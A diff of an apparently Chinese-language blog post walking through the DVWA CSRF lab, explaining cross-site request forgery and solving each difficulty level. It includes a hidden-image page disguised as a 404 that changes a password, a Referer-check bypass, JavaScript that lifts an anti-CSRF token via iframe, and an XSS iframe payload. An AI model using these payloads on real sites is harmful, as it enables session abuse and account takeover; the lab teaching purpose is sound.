@@ -228,19 +228,19 @@
             
             <div class="markdown-body">
               <p>CSRF，全称Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS区别在于CSRF并没有盗取cookie而是直接利用。</p>
-<p>举个栗子：</p>
-<p>A要汇八万给B，A可以通过对银行的网站发送请求<code>http://bank/account=A&amp;amout=80000&amp;receive=B</code>(假设)这时候C想得到这八万，他就可以先自己做一个网站，在网站中放入如下代码：  <code>http://bank/account=A&amp;amount=80000&amp;receive=C</code>，然后通过广告或者链接诱使 A 来访问他的网站。当 A 访问该网站时，上述 url 就会从 A 的浏览器发向银行，而这个请求会附带  A浏览器中的 cookie 一起发向银行服务器。多数情况下，请求会失败，因为他会验证 A的信息，但如果 A  当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 A 的认证信息。这时， url 请求就会得到响应，钱将从A的账号转移到C 的账号，而 A不知情。即使A去银行查询记录，也只能发现有一个来自于他本人的合法请求转移了资金。（就很惨，不过现在的银行的网站应该没有这种漏洞吧）</p>
+<p>举个栗子🌞🌞🌞：</p>
+<p>A要汇八万给B，A可以通过对银行的网站发送请求<code>http://bank/account=A&amp;amout=80000&amp;receive=B</code>(假设)这时候C想得到这八万，他就可以先自己做一个网站，在网站中放入如下代码：  <code>http://bank/account=A&amp;amount=80000&amp;receive=C</code>，然后通过广告或者链接诱使 A 来访问他的网站。当 A 访问该网站时，上述 url 就会从 A 的浏览器发向银行，而这个请求会附带  A浏览器中的 cookie 一起发向银行服务器。多数情况下，请求会失败，因为他会验证 A的信息，但如果 A  当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 A 的认证信息。这时， url 请求就会得到响应，钱将从A的账号转移到C 的账号，而 A不知情。即使A去银行查询记录，也只能发现有一个来自于他本人的合法请求转移了资金。（就很惨，不过现在的银行的网站应该没有这种漏洞吧👏👏👏）</p>
 <p><strong>CSRF漏洞检测</strong></p>
 <p>抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，则存在CSRF漏洞。也可以借助工具</p>
 <p>检测工具:<code>CSRFTester</code>，<code>CSRF Request Builder</code>.</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p><img src="/2021/02/03/dvwa6/1.jpg" srcset="/img/loading.gif" alt="1"></p>
+<h1>low</h1>
+<p><img src="/2021/02/03/dvwa6/1.jpg" srcset="/img/loading.gif" alt="1"></p>
 <p>没有防御CSRF</p>
 <p>在页面更改密码发现网址<code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code>但不能直接放这个网址（可以用在线工具将网址变短)去诱导别人点击（谁那么傻)所以要委婉一点:</p>
 <p>先在我的虚拟机(模拟一下攻击者的主机)上写个网页:</p>
 <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></code></pre>
-
 <p>然后再物理机上访问它（模拟受害者）</p>
 <p><img src="/2021/02/03/dvwa6/2.jpg" srcset="/img/loading.gif" alt="2"></p>
 <p>然后查看一下管理员的密码</p>
@@ -248,12 +248,13 @@
 <p>解码</p>
 <p><img src="/2021/02/03/dvwa6/4.jpg" srcset="/img/loading.gif" alt="4"></p>
 <p>密码就被改辽。也可以抓包改网址处理</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> )</code></pre>
-
+<h1>medium</h1>
+<pre><code class="hljs autoit"><span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> )</code></pre>
 <p>增加了对用户请求头的中的Referer字段的校验，请求头中的Referer字段必须包含主机地址。</p>
 <p><img src="/2021/02/03/dvwa6/7.jpg" srcset="/img/loading.gif" alt="7"></p>
 <p>只要包含了主机地址就可以绕过，所以构造的文件名为：<code>127.0.0.1.html</code>即可绕过。也可在burp中<code>CSRF POC</code>模块中更改。</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求（之前介绍过)token值被放到url最后。本关解题关键是利用用户的cookie去修改密码的页面获取关键的token。构造一个攻击页面，引诱受害者访问(PS:这个攻击代码是去教程copy的，等我系统学习一下JavaScript在来自己写一个,不过里面用到的函数，标签，语法在dvwa||XSS和dvwa||CSP Bypass都讲过了)</p>
+<h1>high</h1>
+<p>代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求（之前介绍过)token值被放到url最后。本关解题关键是利用用户的cookie去修改密码的页面获取关键的token。构造一个攻击页面，引诱受害者访问(PS:这个攻击代码是去教程copy的，等我系统学习一下JavaScript在来自己写一个,不过里面用到的函数，标签，语法在dvwa||XSS和dvwa||CSP Bypass都讲过了)</p>
 <pre><code class="hljs pgsql">&lt;script <span class="hljs-keyword">type</span>=&quot;text/javascript&quot;&gt;
     <span class="hljs-keyword">function</span> attack()&#123;
         document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>;
@@ -272,9 +273,9 @@
         &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;Change&quot; <span class="hljs-keyword">value</span>=&quot;Change&quot;&gt;
     &lt;/form&gt;
 &lt;/body&gt;</code></pre>
-
-<p>因为浏览器不允许跨域，而用户的服务器在本地端，攻击者在另一个服务器(我的虚拟机里)，当用户主动发送信息给攻击者的服务器时，攻击脚本才可能获取token令牌。这就要结合之前学的XSS辽，在XSS的high中输入 <code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt; </code>，即可获取token。参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12736823.html">high-绕过token</a>。</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>本关要求输入之前的密码，CSRF就有点困难了，除非攻击者能得到用户当前密码。</p>
+<p>因为浏览器不允许跨域，而用户的服务器在本地端，攻击者在另一个服务器(我的虚拟机里)，当用户主动发送信息给攻击者的服务器时，攻击脚本才可能获取token令牌。这就要结合之前学的XSS辽，在XSS的high中输入 <code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt; </code>，即可获取token。参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/12736823.html">high-绕过token</a>。</p>
+<h1>impossible</h1>
+<p>本关要求输入之前的密码，CSRF就有点困难了，除非攻击者能得到用户当前密码。</p>
 
             </div>
             <hr>
@@ -290,6 +291,12 @@
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2021/02/08/SSRF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSRF</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
